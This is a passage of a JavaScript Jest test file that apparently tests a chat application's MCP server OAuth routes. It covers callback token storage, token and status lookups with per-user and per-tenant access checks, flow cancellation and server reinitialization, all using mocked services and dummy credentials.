        `${getBasePath()}/oauth/success?serverName=test-server`,
      );
      expect(MCPTokenStorage.storeTokens).toHaveBeenCalled();
      expect(mockMcpManager.withUserConnectionLease).not.toHaveBeenCalled();
      expect(updateMCPServerTools).not.toHaveBeenCalled();
      expect(mockOAuthReconnectionManager.clearReconnection).toHaveBeenCalledWith(
        'test-user-id',
        'test-server',
      );
      expect(mockFlowManager.completeFlow).toHaveBeenCalledWith(
        'tool-flow-request-scoped',
        'mcp_oauth',
        mockTokens,
      );
      expect(logger.warn).not.toHaveBeenCalledWith(
        expect.stringContaining('Failed to reconnect test-server after OAuth'),
        expect.anything(),
      );
    });

    it('should redirect to error page if token storage fails', async () => {
      // mockRegistryInstance is defined at the top of the file
      const mockFlowManager = {
        completeFlow: jest.fn().mockResolvedValue(),
        deleteFlow: jest.fn().mockResolvedValue(true),
      };
      const mockFlowState = {
        state: 'test-user-id:test-server',
        serverName: 'test-server',
        userId: 'test-user-id',
        metadata: { toolFlowId: 'tool-flow-123' },
        clientInfo: {},
        codeVerifier: 'test-verifier',
      };
      const mockTokens = {
        access_token: 'test-access-token',
        refresh_token: 'test-refresh-token',
      };

      MCPOAuthHandler.getFlowState.mockResolvedValue(mockFlowState);
      mockOAuthCompletion(mockTokens);
      MCPTokenStorage.storeTokens.mockRejectedValue(new Error('store failed'));
      mockRegistryInstance.getServerConfig.mockResolvedValue({});
      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const mockMcpManager = {
        withUserConnectionLease: jest.fn(),
      };
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);

      const flowId = 'test-user-id:test-server';
      const csrfToken = generateTestCsrfToken(flowId);

      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({
          code: 'test-auth-code',
          state: flowId,
        });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(`${basePath}/oauth/error?error=callback_failed`);
      expect(mockFlowManager.completeFlow).not.toHaveBeenCalled();
      expect(mockMcpManager.withUserConnectionLease).not.toHaveBeenCalled();
    });

    it('keeps generation publication inside the token-store rollback boundary', async () => {
      const flowId = 'test-user-id:test-server';
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({ status: 'PENDING', createdAt: Date.now() }),
        completeFlow: jest.fn().mockResolvedValue(),
        deleteFlow: jest.fn().mockResolvedValue(true),
      };
      const storedTokens = {
        access_token: 'stored-access-token',
        credential_set_id: 'credential-set-new',
      };
      MCPOAuthHandler.getFlowState.mockResolvedValue({
        state: flowId,
        serverName: 'test-server',
        userId: 'test-user-id',
        serverUrl: 'https://mcp.example.com/mcp',
        metadata: {},
        clientInfo: {},
        codeVerifier: 'test-verifier',
      });
      mockOAuthCompletion(storedTokens);
      MCPTokenStorage.storeTokens.mockImplementation(async (params) => {
        await params.onStoreCommitted(storedTokens);
        return storedTokens;
      });
      mockRegistryInstance.getServerConfig.mockResolvedValue({
        url: 'https://mcp.example.com/mcp',
      });
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      require('~/server/services/Config').invalidateCachedTools.mockRejectedValue(
        new Error('generation unavailable'),
      );

      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${generateTestCsrfToken(flowId)}`])
        .query({ code: 'test-auth-code', state: flowId });

      expect(response.status).toBe(302);
      expect(response.headers.location).toContain('/oauth/error?error=callback_failed');
      expect(MCPTokenStorage.storeTokens).toHaveBeenCalledWith(
        expect.objectContaining({ onStoreCommitted: expect.any(Function) }),
      );
      expect(mockFlowManager.completeFlow).not.toHaveBeenCalled();
    });

    it('should use original flow state credentials when storing tokens', async () => {
      // mockRegistryInstance is defined at the top of the file
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'PENDING',
          createdAt: Date.now(),
        }),
        completeFlow: jest.fn().mockResolvedValue(),
        deleteFlow: jest.fn().mockResolvedValue(true),
      };
      const clientInfo = {
        client_id: 'client123',
        client_secret: 'client_secret',
      };
      const flowState = {
        state: 'test-user-id:test-server',
        serverName: 'test-server',
        userId: 'test-user-id',
        metadata: { toolFlowId: 'tool-flow-123', serverUrl: 'http://example.com' },
        clientInfo: clientInfo,
        codeVerifier: 'test-verifier',
        status: 'PENDING',
      };
      const mockTokens = {
        access_token: 'test-access-token',
        refresh_token: 'test-refresh-token',
      };

      // First call checks idempotency (status PENDING = not completed)
      // Second call retrieves flow state for processing
      mockFlowManager.getFlowState
        .mockResolvedValueOnce({ status: 'PENDING', createdAt: Date.now() })
        .mockResolvedValueOnce(flowState);

      MCPOAuthHandler.getFlowState.mockResolvedValue(flowState);
      mockOAuthCompletion(mockTokens);
      mockTokenStorageCommit();
      mockRegistryInstance.getServerConfig.mockResolvedValue({});
      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const mockUserConnection = {
        fetchToolsSnapshot: jest.fn().mockResolvedValue({ tools: [], complete: true }),
      };
      const mockMcpManager = createLeasedMcpManager(mockUserConnection);
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
      require('~/config').getOAuthReconnectionManager = jest.fn().mockReturnValue({
        clearReconnection: jest.fn(),
      });

      const flowId = 'test-user-id:test-server';
      const csrfToken = generateTestCsrfToken(flowId);

      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({
          code: 'test-auth-code',
          state: flowId,
        });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(`${basePath}/oauth/success?serverName=test-server`);

      expect(MCPTokenStorage.storeTokens).toHaveBeenCalledWith(
        expect.objectContaining({
          userId: 'test-user-id',
          serverName: 'test-server',
          tokens: mockTokens,
          clientInfo: clientInfo,
          metadata: flowState.metadata,
        }),
      );
    });

    it('should prevent duplicate token exchange with idempotency check', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn(),
      };

      // Flow is already completed
      mockFlowManager.getFlowState.mockResolvedValue({
        status: 'COMPLETED',
        serverName: 'test-server',
        userId: 'test-user-id',
      });

      MCPOAuthHandler.getFlowState.mockResolvedValue({
        state: 'test-user-id:test-server',
        status: 'COMPLETED',
        serverName: 'test-server',
        userId: 'test-user-id',
      });

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const flowId = 'test-user-id:test-server';
      const csrfToken = generateTestCsrfToken(flowId);

      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({
          code: 'test-auth-code',
          state: flowId,
        });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(`${basePath}/oauth/success?serverName=test-server`);

      expect(MCPOAuthHandler.completeOAuthFlow).not.toHaveBeenCalled();
      expect(MCPTokenStorage.storeTokens).not.toHaveBeenCalled();
    });

    it('should reject a retained failed flow without exchanging or storing tokens', async () => {
      const flowId = 'test-user-id:test-server';
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'FAILED',
          error: 'mcp_oauth flow timed out',
        }),
      };

      MCPOAuthHandler.getFlowState.mockResolvedValue({
        state: flowId,
        serverName: 'test-server',
        userId: 'test-user-id',
        metadata: {},
        clientInfo: {},
        codeVerifier: 'test-verifier',
      });
      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const csrfToken = generateTestCsrfToken(flowId);
      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({ code: 'late-auth-code', state: flowId });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(`${basePath}/oauth/error?error=invalid_state`);
      expect(MCPOAuthHandler.completeOAuthFlow).not.toHaveBeenCalled();
      expect(MCPTokenStorage.storeTokens).not.toHaveBeenCalled();
    });

    it('should reject an over-age pending flow without relying on its original monitor', async () => {
      const flowId = 'test-user-id:test-server';
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'PENDING',
          createdAt: Date.now() - PENDING_STALE_MS - 1000,
        }),
      };

      MCPOAuthHandler.getFlowState.mockResolvedValue({
        state: flowId,
        serverName: 'test-server',
        userId: 'test-user-id',
        metadata: {},
        clientInfo: {},
        codeVerifier: 'test-verifier',
      });
      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const csrfToken = generateTestCsrfToken(flowId);
      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({ code: 'late-auth-code', state: flowId });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(`${basePath}/oauth/error?error=invalid_state`);
      expect(MCPOAuthHandler.completeOAuthFlow).not.toHaveBeenCalled();
      expect(MCPTokenStorage.storeTokens).not.toHaveBeenCalled();
    });
  });

  describe('GET /oauth/tokens/:flowId', () => {
    const { getLogStores } = require('~/cache');

    it('should return tokens for completed flow', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'COMPLETED',
          result: {
            access_token: 'test-access-token',
            refresh_token: 'test-refresh-token',
          },
        }),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get('/api/mcp/oauth/tokens/test-user-id:flow-123');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        tokens: {
          access_token: 'test-access-token',
          refresh_token: 'test-refresh-token',
        },
      });
    });

    it('should return tokens for a tenant-prefixed flow owned by the user', async () => {
      const { getTenantId } = require('@librechat/data-schemas');
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'COMPLETED',
          result: {
            access_token: 'tenant-access-token',
          },
        }),
      };

      getTenantId.mockReturnValue('tenant-a');
      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get(
        '/api/mcp/oauth/tokens/tenant:tenant-a:test-user-id:test-server',
      );

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        tokens: {
          access_token: 'tenant-access-token',
        },
      });
      expect(mockFlowManager.getFlowState).toHaveBeenCalledWith(
        'tenant:tenant-a:test-user-id:test-server',
        'mcp_oauth',
      );
    });

    it('should reject tenant-prefixed token flow access from another tenant', async () => {
      const { getTenantId } = require('@librechat/data-schemas');
      getTenantId.mockReturnValue('tenant-b');

      const response = await request(app).get(
        '/api/mcp/oauth/tokens/tenant:tenant-a:test-user-id:test-server',
      );

      expect(response.status).toBe(403);
      expect(response.body).toEqual({ error: 'Access denied' });
    });

    it('should return 401 when user is not authenticated', async () => {
      const unauthApp = express();
      unauthApp.use(express.json());
      unauthApp.use((req, res, next) => {
        req.user = null;
        next();
      });
      unauthApp.use('/api/mcp', mcpRouter);

      const response = await request(unauthApp).get('/api/mcp/oauth/tokens/test-flow-id');

      expect(response.status).toBe(401);
      expect(response.body).toEqual({ error: 'User not authenticated' });
    });

    it('should return 403 when user tries to access flow they do not own', async () => {
      const response = await request(app).get('/api/mcp/oauth/tokens/other-user-id:flow-123');

      expect(response.status).toBe(403);
      expect(response.body).toEqual({ error: 'Access denied' });
    });

    it('should return 404 when flow is not found', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue(null),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get(
        '/api/mcp/oauth/tokens/test-user-id:non-existent-flow',
      );

      expect(response.status).toBe(404);
      expect(response.body).toEqual({ error: 'Flow not found' });
    });

    it('should return 400 when flow is not completed', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'PENDING',
          result: null,
        }),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get('/api/mcp/oauth/tokens/test-user-id:pending-flow');

      expect(response.status).toBe(400);
      expect(response.body).toEqual({ error: 'Flow not completed' });
    });

    it('should return 500 when token retrieval throws an unexpected error', async () => {
      getLogStores.mockImplementation(() => {
        throw new Error('Database connection failed');
      });

      const response = await request(app).get('/api/mcp/oauth/tokens/test-user-id:error-flow');

      expect(response.status).toBe(500);
      expect(response.body).toEqual({ error: 'Failed to get tokens' });
    });
  });

  describe('GET /oauth/status/:flowId', () => {
    const { getLogStores } = require('~/cache');

    it('should return flow status when flow exists', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'PENDING',
          error: null,
        }),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get('/api/mcp/oauth/status/test-user-id:test-server');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        status: 'PENDING',
        completed: false,
        failed: false,
        error: null,
      });
    });

    it('should return retained timeout failures as terminal status', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'FAILED',
          error: 'mcp_oauth flow timed out',
        }),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get('/api/mcp/oauth/status/test-user-id:test-server');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        status: 'FAILED',
        completed: false,
        failed: true,
        error: 'mcp_oauth flow timed out',
      });
    });

    it('should return flow status for a tenant-prefixed flow owned by the user', async () => {
      const { getTenantId } = require('@librechat/data-schemas');
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'PENDING',
          error: null,
        }),
      };

      getTenantId.mockReturnValue('tenant-a');
      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get(
        '/api/mcp/oauth/status/tenant:tenant-a:test-user-id:test-server',
      );

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        status: 'PENDING',
        completed: false,
        failed: false,
        error: null,
      });
      expect(mockFlowManager.getFlowState).toHaveBeenCalledWith(
        'tenant:tenant-a:test-user-id:test-server',
        'mcp_oauth',
      );
    });

    it('should reject tenant-prefixed status access from another tenant', async () => {
      const { getTenantId } = require('@librechat/data-schemas');
      getTenantId.mockReturnValue('tenant-b');

      const response = await request(app).get(
        '/api/mcp/oauth/status/tenant:tenant-a:test-user-id:test-server',
      );

      expect(response.status).toBe(403);
      expect(response.body).toEqual({ error: 'Access denied' });
    });

    it('should return 403 when flowId does not match authenticated user', async () => {
      const response = await request(app).get('/api/mcp/oauth/status/other-user-id:test-server');

      expect(response.status).toBe(403);
      expect(response.body).toEqual({ error: 'Access denied' });
    });

    it('should return 404 when flow is not found', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue(null),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get('/api/mcp/oauth/status/test-user-id:non-existent');

      expect(response.status).toBe(404);
      expect(response.body).toEqual({ error: 'Flow not found' });
    });

    it('should return 500 when status check fails', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockRejectedValue(new Error('Database error')),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const response = await request(app).get('/api/mcp/oauth/status/test-user-id:error-server');

      expect(response.status).toBe(500);
      expect(response.body).toEqual({ error: 'Failed to get flow status' });
    });
  });

  describe('POST /oauth/cancel/:serverName', () => {
    const { MCPOAuthHandler } = require('@librechat/api');
    const { getLogStores } = require('~/cache');

    it('should cancel OAuth flow successfully', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'PENDING',
          createdAt: 123,
          metadata: { state: 'opaque-state' },
        }),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      MCPOAuthHandler.generateFlowId.mockReturnValue('test-user-id:test-server');

      const response = await request(app).post('/api/mcp/oauth/cancel/test-server');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        success: true,
        message: 'OAuth flow for test-server cancelled successfully',
      });

      expect(MCPOAuthHandler.failFlowAndDeleteStateMapping).toHaveBeenCalledWith(
        'test-user-id:test-server',
        expect.objectContaining({ metadata: { state: 'opaque-state' } }),
        mockFlowManager,
        'User cancelled OAuth flow',
      );
    });

    it('should return success message when no active flow exists', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue(null),
      };

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      MCPOAuthHandler.generateFlowId.mockReturnValue('test-user-id:test-server');

      const response = await request(app).post('/api/mcp/oauth/cancel/test-server');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        success: true,
        message: 'No active OAuth flow to cancel',
      });
    });

    it('should return 500 when cancellation fails', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({ status: 'PENDING' }),
      };
      MCPOAuthHandler.failFlowAndDeleteStateMapping.mockRejectedValueOnce(
        new Error('Database error'),
      );

      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      MCPOAuthHandler.generateFlowId.mockReturnValue('test-user-id:test-server');

      const response = await request(app).post('/api/mcp/oauth/cancel/test-server');

      expect(response.status).toBe(500);
      expect(response.body).toEqual({ error: 'Failed to cancel OAuth flow' });
    });

    it('should return 401 when user is not authenticated', async () => {
      const unauthApp = express();
      unauthApp.use(express.json());
      unauthApp.use((req, res, next) => {
        req.user = null;
        next();
      });
      unauthApp.use('/api/mcp', mcpRouter);

      const response = await request(unauthApp).post('/api/mcp/oauth/cancel/test-server');

      expect(response.status).toBe(401);
      expect(response.body).toEqual({ error: 'User not authenticated' });
    });
  });

  describe('POST /:serverName/reinitialize', () => {
    // mockRegistryInstance is defined at the top of the file

    it('should return 404 when server is not found in configuration', async () => {
      const mockMcpManager = {
        disconnectUserConnection: jest.fn().mockResolvedValue(),
      };

      mockRegistryInstance.getServerConfig.mockResolvedValue(null);
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
      require('~/config').getFlowStateManager.mockReturnValue({});
      require('~/cache').getLogStores.mockReturnValue({});

      const response = await request(app).post('/api/mcp/non-existent-server/reinitialize');

      expect(response.status).toBe(404);
      expect(response.body).toEqual({
        error: "MCP server 'non-existent-server' not found in configuration",
      });
    });

    it('should handle OAuth requirement during reinitialize', async () => {
      const mockMcpManager = {
        disconnectUserConnection: jest.fn().mockResolvedValue(),
        mcpConfigs: {},
        getUserConnection: jest.fn().mockImplementation(async ({ oauthStart }) => {
          if (oauthStart) {
            await oauthStart('https://oauth.example.com/auth');
          }
          throw new Error('OAuth flow initiated - return early');
        }),
      };

      mockRegistryInstance.getServerConfig.mockResolvedValue({
        customUserVars: {},
      });
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
      require('~/config').getFlowStateManager.mockReturnValue({});
      require('~/cache').getLogStores.mockReturnValue({});
      require('~/server/services/Tools/mcp').reinitMCPServer.mockResolvedValue({
        success: true,
        message: "MCP server 'oauth-server' ready for OAuth authentication",
        serverName: 'oauth-server',
        oauthRequired: true,
        oauthUrl: 'https://oauth.example.com/auth',
      });

      const response = await request(app).post('/api/mcp/oauth-server/reinitialize');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        success: true,
        message: "MCP server 'oauth-server' ready for OAuth authentication",
        serverName: 'oauth-server',
        oauthRequired: true,
        oauthUrl: 'https://oauth.example.com/auth',
        flowId: 'test-user-id:oauth-server',
        oauthTimeout: expect.any(Number),
      });
    });

    it('should return the remaining lifetime for a reused OAuth flow', async () => {
      const now = 1_800_000_000_000;
      const dateNowSpy = jest.spyOn(Date, 'now').mockReturnValue(now);
      const mockMcpManager = {
        disconnectUserConnection: jest.fn().mockResolvedValue(),
      };

      mockRegistryInstance.getServerConfig.mockResolvedValue({ customUserVars: {} });
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
      require('~/server/services/Tools/mcp').reinitMCPServer.mockResolvedValue({
        success: true,
        message: "MCP server 'oauth-server' ready for OAuth authentication",
        serverName: 'oauth-server',
        oauthRequired: true,
        oauthUrl: 'https://oauth.example.com/auth',
        oauthExpiresAt: now + 45_000,
      });

      const response = await request(app).post('/api/mcp/oauth-server/reinitialize');
      dateNowSpy.mockRestore();

      expect(response.status).toBe(200);
      expect(response.body.oauthTimeout).toBe(45_000);
    });

    it('should return structured reinitialization failure details', async () => {
      const mockMcpManager = {
        disconnectUserConnection: jest.fn().mockResolvedValue(),
      };

      mockRegistryInstance.getServerConfig.mockResolvedValue({});
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
      require('~/server/services/Tools/mcp').reinitMCPServer.mockResolvedValue({
        success: false,
        message: "MCP server 'test-server' requires user-provided variables",
        serverName: 'test-server',
        oauthRequired: false,
        oauthUrl: null,
        failureReason: 'missing_custom_user_vars',
        missingUserVars: ['API_KEY'],
      });

      const response = await request(app).post('/api/mcp/test-server/reinitialize');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        success: false,
        message: "MCP server 'test-server' requires user-provided variables",
        serverName: 'test-server',
        oauthRequired: false,
        oauthUrl: null,
        failureReason: 'missing_custom_user_vars',
        missingUserVars: ['API_KEY'],
      });
    });

    it('should return 500 when reinitialize fails with non-OAuth error', async () => {
      const mockMcpManager = {
        disconnectUserConnection: jest.fn().mockResolvedValue(),
        mcpConfigs: {},
        getUserConnection: jest.fn().mockRejectedValue(new Error('Connection failed')),
      };

      mockRegistryInstance.getServerConfig.mockResolvedValue({});
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
      require('~/config').getFlowStateManager.mockReturnValue({});
      require('~/cache').getLogStores.mockReturnValue({});
      require('~/server/services/Tools/mcp').reinitMCPServer.mockResolvedValue(null);

      const response = await request(app).post('/api/mcp/error-server/reinitialize');

      expect(response.status).toBe(500);
      expect(response.body).toEqual({
        error: 'Failed to reinitialize MCP server for user',
      });
    });

    /**
     * Codex Finding 2 regression: the reinitialize route must forward a
     * session-aware upstream-token closure to reinitMCPServer so OBO servers
     * can mint a downstream token. The closure is built at the route boundary
     * (from req/res) and passed as `upstreamTokenProvider`; the raw `req` is
     * NOT threaded into the MCP layer.
     */
    it('forwards an upstream-token closure (not req) into reinitMCPServer for OBO session access', async () => {
      const mockMcpManager = {
        disconnectUserConnection: jest.fn().mockResolvedValue(),
      };
      mockRegistryInstance.getServerConfig.mockResolvedValue({});
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
      require('~/config').getFlowStateManager.mockReturnValue({});
      require('~/cache').getLogStores.mockReturnValue({});
      const reinitSpy = require('~/server/services/Tools/mcp').reinitMCPServer;
      reinitSpy.mockResolvedValue({ success: true, serverName: 'obo-server' });

      await request(app).post('/api/mcp/obo-server/reinitialize');

      expect(reinitSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          upstreamTokenProvider: expect.any(Function),
          oboIdentityContext: expect.objectContaining({
            appUserId: 'test-user-id',
          }),
        }),
      );
      const [params] = reinitSpy.mock.calls[reinitSpy.mock.calls.length - 1];
      expect(params).not.toHaveProperty('req');
    });

    it('should return 500 when unexpected error occurs', async () => {
      const mockMcpManager = {
        disconnectUserConnection: jest.fn(),
      };

      mockRegistryInstance.getServerConfig.mockImplementation(() => {
        throw new Error('Config loading failed');
      });
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);

      const response = await request(app).post('/api/mcp/test-server/reinitialize');

      expect(response.status).toBe(500);
      expect(response.body).toEqual({ error: 'Internal server error' });
    });

    it('should return 401 when user is not authenticated', async () => {
      const unauthApp = express();
      unauthApp.use(express.json());
      unauthApp.use((req, res, next) => {
        req.user = null;
        next();
      });
      unauthApp.use('/api/mcp', mcpRouter);

      const response = await request(unauthApp).post('/api/mcp/test-server/reinitialize');

      expect(response.status).toBe(401);
      expect(response.body).toEqual({ error: 'User not authenticated' });
    });

    it('should successfully reinitialize server and cache tools', async () => {
      const mockUserConnection = {
        fetchToolsSnapshot: jest.fn().mockResolvedValue({
          tools: [
            { name: 'tool1', description: 'Test tool 1', inputSchema: { type: 'object' } },
            { name: 'tool2', description: 'Test tool 2', inputSchema: { type: 'object' } },
          ],
          complete: true,
        }),
      };

      const mockMcpManager = {
        disconnectUserConnection: jest.fn().mockResolvedValue(),
        getUserConnection: jest.fn().mockResolvedValue(mockUserConnection),
      };

      mockRegistryInstance.getServerConfig.mockResolvedValue({
        endpoint: 'http://test-server.com',
      });
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
      require('~/config').getFlowStateManager.mockReturnValue({});
      require('~/cache').getLogStores.mockReturnValue({});

      const { getCachedTools, setCachedTools } = require('~/server/services/Config');
      const { updateMCPServerTools } = require('~/server/services/Config/mcp');
      getCachedTools.mockResolvedValue({});
      setCachedTools.mockResolvedValue();
      updateMCPServerTools.mockResolvedValue();

      require('~/server/services/Tools/mcp').reinitMCPServer.mockResolvedValue({
        success: true,
        message: "MCP server 'test-server' reinitialized successfully",
        serverName: 'test-server',
        oauthRequired: false,
        oauthUrl: null,
      });

      const response = await request(app).post('/api/mcp/test-server/reinitialize');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        success: true,
        message: "MCP server 'test-server' reinitialized successfully",
        serverName: 'test-server',
        oauthRequired: false,
        oauthUrl: null,
      });
      expect(mockMcpManager.disconnectUserConnection).toHaveBeenCalledWith(
        'test-user-id',
        'test-server',
      );
      expect(require('~/server/services/Config').invalidateCachedTools).toHaveBeenCalledWith({
        userId: 'test-user-id',
        serverName: 'test-server',
      });
      expect(
        require('~/server/services/Config').invalidateCachedTools.mock.invocationCallOrder[0],
      ).toBeLessThan(mockMcpManager.disconnectUserConnection.mock.invocationCallOrder[0]);
    });

    it('should handle server with custom user variables', async () => {
      const mockUserConnection = {
        fetchToolsSnapshot: jest.fn().mockResolvedValue({ tools: [], complete: true }),
      };

      const mockMcpManager = {
        disconnectUserConnection: jest.fn().mockResolvedValue(),
        getUserConnection: jest.fn().mockResolvedValue(mockUserConnection),
      };

      mockRegistryInstance.getServerConfig.mockResolvedValue({
        endpoint: 'http://test-server.com',
        customUserVars: {
          API_KEY: 'some-env-var',
        },
      });
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
      require('~/config').getFlowStateManager.mockReturnValue({});
      require('~/cache').getLogStores.mockReturnValue({});
      require('@librechat/api').getUserMCPAuthMap.mockResolvedValue({
        'mcp:test-server': {
          API_KEY: 'api-key-value',
        },
      });
      require('~/models').findPluginAuthsByKeys.mockResolvedValue([
        { key: 'API_KEY', value: 'api-key-value' },
      ]);

      const { getCachedTools, setCachedTools } = require('~/server/services/Config');
      const { updateMCPServerTools } = require('~/server/services/Config/mcp');
      getCachedTools.mockResolvedValue({});
      setCachedTools.mockResolvedValue();
      updateMCPServerTools.mockResolvedValue();

      require('~/server/services/Tools/mcp').reinitMCPServer.mockResolvedValue({
        success: true,
        message: "MCP server 'test-server' reinitialized successfully",
        serverName: 'test-server',
        oauthRequired: false,
        oauthUrl: null,
      });

      const response = await request(app).post('/api/mcp/test-server/reinitialize');

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(require('@librechat/api').getUserMCPAuthMap).toHaveBeenCalledWith({
        userId: 'test-user-id',
        servers: ['test-server'],
        findPluginAuthsByKeys: require('~/models').findPluginAuthsByKeys,
      });
    });
  });

  describe('GET /connection/status', () => {
    const { getMCPSetupData, getServerConnectionStatus } = require('~/server/services/MCP');

    it('should return connection status for all servers', async () => {
      const mockMcpConfig = {
        server1: { endpoint: 'http://server1.com' },
        server2: { endpoint: 'http://server2.com' },
      };

      getMCPSetupData.mockResolvedValue({
        mcpConfig: mockMcpConfig,
        appConnections: {},
        userConnections: {},
        oauthServers: new Set(),
      });

      getServerConnectionStatus
        .mockResolvedValueOnce({
          connectionState: 'connected',
          requiresOAuth: false,
          authorizationState: 'not_required',
        })
        .mockResolvedValueOnce({
          connectionState: 'disconnected',
          requiresOAuth: true,
          authorizationState: 'needs_authorization',
        });

      const response = await request(app).get('/api/mcp/connection/status');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        success: true,
        oauthTimeout: expect.any(Number),
        connectionStatus: {
          server1: {
            connectionState: 'connected',
            requiresOAuth: false,
            authorizationState: 'not_required',
            authorizationGeneration: 'test-generation',
          },
          server2: {
            connectionState: 'disconnected',
            requiresOAuth: true,
            authorizationState: 'needs_authorization',
            authorizationGeneration: 'test-generation',
          },
        },
      });

      expect(getMCPSetupData).toHaveBeenCalledWith(
        'test-user-id',
        expect.objectContaining({ appConfig: mockRequestConfig }),
      );
      expect(getServerConnectionStatus).toHaveBeenCalledTimes(2);
    });

    it('should batch user variables and pass runtime context into durable status checks', async () => {
      currentUser = { id: 'test-user-id', email: 'user@example.com' };
      const mcpConfig = {
        server1: {
          url: 'https://mcp.example.com/{{LIBRECHAT_USER_ID}}',
          customUserVars: { API_KEY: { title: 'API key' } },
        },
      };
      const userMCPAuthMap = {
        'mcp:server1': { API_KEY: 'secret' },
      };
      getMCPSetupData.mockResolvedValue({
        mcpConfig,
        appConnections: new Map(),
        userConnections: new Map(),
        oauthServers: new Set(),
      });
      require('@librechat/api').getUserMCPAuthMap.mockResolvedValue(userMCPAuthMap);
      getServerConnectionStatus.mockResolvedValue({
        connectionState: 'connected',
        requiresOAuth: true,
        authorizationState: 'authorized',
      });

      const response = await request(app).get('/api/mcp/connection/status');

      expect(response.status).toBe(200);
